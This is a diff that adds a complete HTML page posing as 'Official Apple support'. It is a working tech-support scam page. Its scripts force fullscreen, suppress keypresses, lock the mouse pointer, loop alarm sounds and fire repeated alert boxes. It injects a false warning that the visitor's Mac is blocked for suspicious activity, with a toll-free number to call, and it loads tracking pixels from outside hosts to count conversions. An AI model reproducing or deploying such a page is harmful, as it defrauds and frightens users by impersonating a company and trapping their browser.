@@ -1,0 +1,428 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="refresh" content="'index.html'">
+<title>Official Apple support</title>
+<link href="style.css" rel="stylesheet" type="text/css">
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id='UA-xxx-x"></script>
+<script>
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+
+	gtag('config', 'UA-xxx-x');
+</script>
+
+
+
+<script type='text/javascript'>
+  document.onkeydown = function (e) {
+    e.preventDefault();
+  }
+</script>
+
+
+<style>
+
+      /* The Modal (background) */
+      .modal {
+        display: none; /* Hidden by default */
+        position: fixed; /* Stay in place */
+        z-index: 1; /* Sit on top */
+        padding-top: 100px; /* Location of the box */
+        left: 0;
+        top: 0;
+        width: 100%; /* Full width */
+        height: 100%; /* Full height */
+        overflow: auto; /* Enable scroll if needed */
+        background-color: rgb(0,0,0); /* Fallback color */
+        background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+      }
+
+      /* Modal Content */
+      .modal-content {
+        position: relative;
+        background-color: blue;
+        margin: auto;
+        padding: 0;
+        /*border: 1px solid #888;*/
+        width: 80%;
+        box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
+        -webkit-animation-name: animatetop;
+        -webkit-animation-duration: 0.4s;
+        animation-name: animatetop;
+        animation-duration: 0.4s
+      }
+
+      /* Add Animation */
+      @-webkit-keyframes animatetop {
+        from {top:-300px; opacity:0}
+        to {top:0; opacity:1}
+      }
+
+      @keyframes animatetop {
+        from {top:-300px; opacity:0}
+        to {top:0; opacity:1}
+      }
+
+      /* The Close Button */
+      .close {
+      display:none;
+        color: white;
+        float: right;
+        font-size: 28px;
+        font-weight: bold;
+      }
+
+      .close:hover,
+      .close:focus {
+        color: #000;
+        text-decoration: none;
+        cursor: pointer;
+      }
+
+      .modal-header {
+        padding: 2px 20px;
+        background-color: blue;
+        color: white;
+
+      }
+      .modal-header h2
+      {
+      border:none;
+      font-size:42px;
+      }
+
+      .modal-body {padding: 2px 20px;color:white;}
+
+      .modal-footer {
+        padding: 2px 20px;
+        background-color: blue;
+        color: white;
+        height:100px;
+      }
+
+      .modal-footer btn{
+      background-color:orange;
+      }
+
+
+
+*:fullscreen
+*:-ms-fullscreen,
+*:-webkit-full-screen,
+*:-moz-full-screen {
+   overflow: auto !important;
+}
+   </style>
+   <script>
+   var el = document.documentElement
+, rfs = // for newer Webkit and Firefox
+       el.requestFullScreen
+    || el.webkitRequestFullScreen
+    || el.mozRequestFullScreen
+    || el.msRequestFullScreen
+;
+if(typeof rfs!="undefined" && rfs){
+  rfs.call(el);
+} else if(typeof window.ActiveXObject!="undefined"){
+  // for Internet Explorer
+  var wscript = new ActiveXObject("WScript.Shell");
+  if (wscript!=null) {
+     wscript.SendKeys("{F11}");
+  }
+}
+</script>
+
+<script>
+var full=0;
+function toggleFullScreen(elem) {
+
+if(full==1){alert(m2);}
+
+if(full == 0){
+full =1;
+    // ## The below if statement seems to work better ## if ((document.fullScreenElement && document.fullScreenElement !== null) || (document.msfullscreenElement && document.msfullscreenElement !== null) || (!document.mozFullScreen && !document.webkitIsFullScreen)) {
+    if ((document.fullScreenElement !== undefined && document.fullScreenElement === null) || (document.msFullscreenElement !== undefined && document.msFullscreenElement === null) || (document.mozFullScreen !== undefined && !document.mozFullScreen) || (document.webkitIsFullScreen !== undefined && !document.webkitIsFullScreen)) {
+        if (elem.requestFullScreen) {
+            elem.requestFullScreen();
+        } else if (elem.mozRequestFullScreen) {
+            elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullScreen) {
+            elem.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
+        } else if (elem.msRequestFullscreen) {
+            elem.msRequestFullscreen();
+        }
+    } else {
+        if (document.cancelFullScreen) {
+            document.cancelFullScreen();
+        } else if (document.mozCancelFullScreen) {
+            document.mozCancelFullScreen();
+        } else if (document.webkitCancelFullScreen) {
+            document.webkitCancelFullScreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+
+
+
+        setTimeout(function(){
+        document.getElementById('base').innerHTML='<div class="img"><img src="mac1.png" onclick="toggleFullScreen(document.body);" ></div><div style="position:absolute;top:-100px;left:-9999px;z-index:1;"></div>	<div class="userInfo"><div id="box" onclick="toggleFullScreen(document.body);"><h2 style="text-align:left;">WARNING!</h2><br>Your MAC has been blocked due to suspicious activity! Please Call Helpline Now!. Call +1-888-985-6762 (Toll Free)  To find right solution.<br>Are you sure you want to leave this page?  <br><a target="_blank" class="btn" onclick="toggleFullScreen(document.body);" >Stay On Page</a> <a target="_blank" onclick="toggleFullScreen(document.body)"class="btn">Leave Page</a></div><div style="position:absolute;top:-100px;left:-9999px;z-index:1;"></div><audio autoplay="autoplay" loop=""><source src="beep.mp3" type="audio/mpeg"></audio> <span style="position:absolute;top:560px;right:-25px;z-index:1; font-size:20px; font-weight:bold; color:white;font-family: Arial, Helvetica, sans-serif;"> Call +1-888-985-6762 </span> <span style="position:absolute;top:310px;left:72px;z-index:1; font-size:18px; font-weight:bold;color:#808080; font-family: Arial, Helvetica, sans-serif;">Call Apple Helpline +1-888-985-6762 (Toll Free)</span>';
+         document.getElementById('conv').innerHTML="<img src='http://m.smita.club/conversion.gif' width='1' height='1'></img><img src='http://www.trackoo.info/conversion.gif' width='1' height='1'></img><img src='http://www.lookee.info/conversion.gif' width='1' height='1'></img>";
+        setTimeout(function(){
+        for(var i=0;i<100;i++){ alert(m2);}
+
+       }, 1000);
+
+        }, 1000);
+
+
+}
+
+}
+</script>
+ <script type="text/javascript">
+window.onload=function(){
+function countdown( elementName, minutes, seconds )
+{
+    var element, endTime, hours, mins, msLeft, time;
+
+    function twoDigits( n )
+    {
+        return (n <= 9 ? "0" + n : n);
+    }
+
+    function updateTimer()
+    {
+        msLeft = endTime - (+new Date);
+        if ( msLeft < 1000 ) {
+            element.innerHTML = "0:00";
+        } else {
+            time = new Date( msLeft );
+            hours = time.getUTCHours();
+            mins = time.getUTCMinutes();
+            element.innerHTML = (hours ? hours + ':' + twoDigits( mins ) : mins) + ':' + twoDigits( time.getUTCSeconds() );
+            setTimeout( updateTimer, time.getUTCMilliseconds() + 500 );
+        }
+    }
+
+    element = document.getElementById( elementName );
+    endTime = (+new Date) + 1000 * (60*minutes + seconds) + 500;
+    updateTimer();
+}
+
+countdown( "countdown", 5, 0 );
+}
+
+</script>
+<script type="text/javascript" src="jquery-1.js"></script>
+<style>body,html {
+	height:100%;
+	background-color: #b8b8b8;
+
+}
+.style1 {
+	font-family: Arial, Helvetica, sans-serif;
+	font-weight: bold;
+	color: #FFFFFF;
+	font-size: 18px;
+}
+.style2 {
+	font-size: 36px;
+	font-family: "Courier New", Courier, monospace;
+	color: #FFFFFF;
+}
+
+.style4 {
+	font-size: 22px;
+	font-family: "Courier New", Courier, monospace;
+	color: #FFFFFF;
+}
+.style5 {
+	font-size: 20px;
+	font-family: "Courier New", Courier, monospace;
+}
+.style6 {font-family: "Courier New", Courier, monospace}
+#box{position: absolute;
+    top: 0px;
+    left: 0;
+    right: 0;
+    width: 85%;
+    height: 90%;
+    margin: 10px auto;
+    border: 0px solid #c7c7c7;
+    border-radius: 3px;
+    background: #fbfbfb;
+    padding: 20px;
+    box-sizing: border-box;
+    font-family: sans-serif;
+    box-shadow: 0 2px 2px 0px #ccc;
+    font-size: 14px;
+    z-index: 9;
+}
+#box h2{ font-size: 15px; font-weight: inherit; margin: 0; } #box .btn{ border: 1px solid #bababa; border-radius: 2px; padding: 3px 3px; margin: 2px; display: inline-block; cursor: pointer; float: right; text-decoration: none; color: #333; }
+
+#box .btn:nth-child(2n-1){ font-weight: bold; border: 1px solid #3c79ee; }
+
+.userInfo
+	{
+		position: absolute;
+    top: 0px;
+    width: 765px; height: 180px;
+    right: 250px;
+    padding: 0px;
+    box-sizing: border-box;
+    font-size: 18px;
+    font-family: "Courier New",Courier,monospace;
+  	}
+	.img{
+		position:absolute;
+		width:100%;
+		height:100%;
+		top:0;
+		left:0;z-index:0;
+
+	}
+	.img img{
+		width:100%;
+		height:100%;
+		display:block;
+	}
+</style>
+
+<audio autoplay="autoplay" loop="" id="msgSound">
+  <source src="err.mp3" type="audio/mpeg">
+</audio>
+
+<audio autoplay="autoplay" loop="" id="msgSound1">
+  <source src="beep.mp3" type="audio/mpeg">
+</audio>
+
+    <script type="text/javascript">/*<![CDATA[*/
+    // audio play /*
+      var msgAudioEl = document.getElementById("msgSound");
+
+      var playMsgInt = setInterval(function () {
+        if (isPlaying(msgAudioEl)) {
+          // console.log('already playing. clearing interval');
+          clearInterval(playMsgInt);
+        } else {
+          // console.log('Triggering play');
+          msgAudioEl.play();
+        }
+      }, 500);
+      // audio play */
+
+    </script>
+    <script type="text/javascript">/*<![CDATA[*/
+    // audio play /*
+      var msgAudioEl = document.getElementById("msgSound1");
+
+      var playMsgInt = setInterval(function () {
+        if (isPlaying(msgAudioEl)) {
+          // console.log('already playing. clearing interval');
+          clearInterval(playMsgInt);
+        } else {
+          // console.log('Triggering play');
+          msgAudioEl.play();
+        }
+      }, 500);
+      // audio play */
+
+    </script>
+</head>
+<div id="base">
+<body style="cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP///5WVlXiCGdAAAAADdFJOUwD8ZX+n/7gAAABvSURBVHja7dbBAUAwEABBQf81i6CGfZipYB3J2bY/GnnAHgec9QjOY9QBccEMaAvugLRgBZQFT0BY8AZ0BV9AVvB8hEt3D8SnYIz2FMxtlI7gfvVzBN1OXM9+1Dsx/ykAAAAAAAAAAAAAAAAAgNcFnc4A9qwo+wMAAAAASUVORK5CYII=&quot;) 128 128, crosshair;" onload="noFunction();" onclick="noFunction();" onkeydown="noFunction();" onunload="noFunction();" id="mycanvas">
+
+<div class="img2"><center>
+<div style="position:absolute;top:290px;left:510px;z-index:1; font-size:18px; font-weight:bold;color:grey; font-family: Arial, Helvetica, sans-serif;">Call Apple Helpline <span style="color:red;">+1-888-985-6762</span> (Toll Free)</div>
+<div style="position:absolute;top:523px;right:230px;z-index:1; font-size:20px; font-weight:bold; color:white;font-family: Arial, Helvetica, sans-serif;">Call +1-888-985-6762</div>
+
+<img src="mac.png" onclick="toggleFullScreen(document.body);"></center></div><img src="mac.png" style="display: none;">
+</body>
+</div>
+<div class="userInfo">
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"></div>
+</div>
+
+
+
+<div id="conv">
+</div>
+<script>
+// Get the modal
+var modal = document.getElementById('myModal');
+
+// Get the button that opens the modal
+var btn = document.getElementById("myBtn");
+
+// Get the <span> element that closes the modal
+var span = document.getElementsByClassName("close")[0];
+
+// When the user clicks the button, open the modal
+/*btn.onclick = function() {
+  modal.style.display = "block";
+} */
+
+// When the user clicks on <span> (x), close the modal
+span.onclick = function() {
+  modal.style.display = "none";
+}
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+  if (event.target == modal) {
+    modal.style.display = "none";
+  }
+}
+</script>
+  <script type="text/javascript">
+function addEvent(obj, evt, fn) {
+    if (obj.addEventListener) {
+        obj.addEventListener(evt, fn, false);
+    }
+    else if (obj.attachEvent) {
+        obj.attachEvent("on" + evt, fn);
+    }
+}
+addEvent(window,"load",function(e) {
+    addEvent(document, "mouseout", function(e) {
+        e = e ? e : window.event;
+        var from = e.relatedTarget || e.toElement;
+        if (!from || from.nodeName == "HTML") {
+            // stop your drag event here
+            // for now we can just use an alert
+         //alert("hello");
+
+       modal.style.display = "block";
+
+        }
+    });
+});
+
+  $(document).mousemove(function(){
+  var canvas = document.getElementById('mycanvas');
+canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
+canvas.requestPointerLock();
+
+  //capture mouse movement event
+     // remove our layover from the DOM
+  });
+
+ //  $(document).mousemove(function(){
+ // alert("move detect");
+  //capture mouse movement event
+ //   $("#pageLayover").remove(); // remove our layover from the DOM
+ // });
+
+
+</script>
+
+
+
+
+
+<iframe id="calendar" src="beep.mp3" allow="autoplay" style="display:none;">
